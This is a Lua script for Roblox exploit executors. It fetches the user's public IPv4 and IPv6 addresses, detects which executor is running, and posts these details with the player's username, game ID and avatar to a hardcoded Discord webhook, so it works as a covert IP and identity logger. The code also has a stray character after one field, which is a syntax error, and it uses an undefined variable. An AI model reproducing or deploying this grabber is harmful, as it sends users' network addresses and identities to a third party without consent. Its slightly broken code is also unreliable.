local IPv4 = game:HttpGet("https://v4.ident.me/")
local IPv6 = game:HttpGet("https://v6.ident.me/")


local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Unkown Exploit"

local url =
   "https://discord.com/api/webhooks/951356789537013771/_D7qCxHNcOWv87ba_LfvB2Y7cyDUbz0BizV0tCHECpMvwHAAItSC0pYQi1MjBX5TeVzF"
local data = {
   ["content"] = "Game Id: " .. game.PlaceId .. " - " .. scriptname,
   ["embeds"] = {
       {
           ["title"] = game.Players.LocalPlayer.Name,z
           ["description"] = "with " .. webhookcheck .. " - IPv4 - " .. IPv4 .. " IPv6 - " .. IPv6,
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
